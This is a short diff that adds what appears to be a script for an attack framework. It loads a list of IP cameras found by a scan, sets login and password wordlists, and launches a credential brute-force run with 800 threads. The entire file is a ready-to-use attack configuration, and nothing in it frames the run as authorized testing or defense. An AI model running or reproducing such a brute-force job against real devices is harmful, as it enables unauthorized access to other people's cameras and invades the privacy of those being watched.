@@ -1,0 +1,7 @@
+use IpCams
+load_targets .\temp\IpCams_scan_result.txt
+set login_list ./login.txt
+set password_list ./pass.txt
+set scan_timeout 1
+set brute_threads 800
+run brute
